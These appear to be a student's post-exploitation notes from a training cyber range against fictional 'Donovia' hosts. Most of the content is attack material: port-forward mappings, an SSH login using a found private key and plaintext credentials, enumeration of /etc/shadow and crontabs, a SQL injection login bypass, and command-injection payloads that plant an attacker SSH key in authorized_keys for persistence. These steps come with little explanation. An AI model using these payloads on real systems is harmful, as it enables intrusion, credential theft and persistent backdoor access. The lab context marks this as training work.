Post Exploitation

Look at crontabs / cronjobs

Lin : 13000 -> 100 : 80 (HTTP)
Lin : 13001-> 100 : 2222 (SSH)
Lin : 13002 -> .150.253 : 80 (HTTP)

Lin : 13003 -> .100 -> .150.253:514

To get into the thing lin.intranet.donvia
192.168.150.253 Donovian-Intranet -> comrade::StudentMidwayPassword
-> ssh -i /var/www/test/.ssh/id_rsa comrade@192.168.150.253 -p 3201
id_rsa is the private key and the ssh -i will use that for it. 

	important files for users
	/etc/passwd or /etc shadow

	important files for name resolution
	/etc/hosts

	important files for scheduled task related to specific users
	/etc/crontab
	sudo crontab -l [finds the scheduled tasks for that user]

	syslog and rsyslog
	cat /etc/rsyslog.d/50-default.conf -> find the default stuff

	cat /etc/security/access.conf to find the root stuff
	
	Antivirus
	cat /etc/rkhunter.conf 
	(start) (end)
	12301 12356
	
	sudo cat /root/brootkit/brootkit-master/br.conf 
	
	

192.168.56.1   badguy -> /etc/hosts

192.168.28.9
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
-

28.100
-80 (HTTP)
	/admin/
	/admin/login.php -> tom' OR 1='1 / tom' OR 1='1 [SQL Injection]
	/img/
-2222 (SSH)
-

192.168.150.253
-80 (HTTP)
-3201 (SSH)
-514 (shell)
	

1. 
ps; ls -l /etc/ -> hosts/ hostname/host.allow/host.deny

extranet.site.donovia

Extranet
-> /home/comrade/Dekstop/network/.mapkey.txt
-> ; find / -type f 2>/dev/null | grep .txt or inventory 

; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGJu3uVk+wZOJUtkiXIONHT91zjK/fgrhvDpu7TBqAut1CLMi87MP8UgYnZLgJg8aCtfslHWBvyztd3VBVbtYc8WCzwMTEQJp6NcMN5V7VlR1CbOYoIUmG2/nu0aviSQ6zbwThA6uatdOTSVUGlfTJ2dzec7CLdB7PuN0a2ghWab9ke3m1JxNcTW+J+OD5tXFdZFl7ei3HV1Wc9T/NTZ/NeEStUqTUMkhm5afp54TVrLo1pikHQWcuCCZmMKXD3CHGXoCDdrxm98JPPb0/DL9Kfl1N2RxHyAfzEVc23v/D9QvgHAlrbM2a1YF4egDfdWaSXJDJtnKdkvklUbKXD+QV student@lin-ops" > /var/www/.ssh/authorized_keys

ssh -p 13001 <; whoami>@127.0.0.1
ssh -p 13001 www-data@127.0.0.1

; ls -la /home/comrade/.ssh/authorized_keys

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGJu3uVk+wZOJUtkiXIONHT91zjK/fgrhvDpu7TBqAut1CLMi87MP8UgYnZLgJg8aCtfslHWBvyztd3VBVbtYc8WCzwMTEQJp6NcMN5V7VlR1CbOYoIUmG2/nu0aviSQ6zbwThA6uatdOTSVUGlfTJ2dzec7CLdB7PuN0a2ghWab9ke3m1JxNcTW+J+OD5tXFdZFl7ei3HV1Wc9T/NTZ/NeEStUqTUMkhm5afp54TVrLo1pikHQWcuCCZmMKXD3CHGXoCDdrxm98JPPb0/DL9Kfl1N2RxHyAfzEVc23v/D9QvgHAlrbM2a1YF4egDfdWaSXJDJtnKdkvklUbKXD+QV comrade@lin-ops" > /home/comrade/.ssh/authorized_keys

; cat /home/comrade/.ssh/authorized_keys
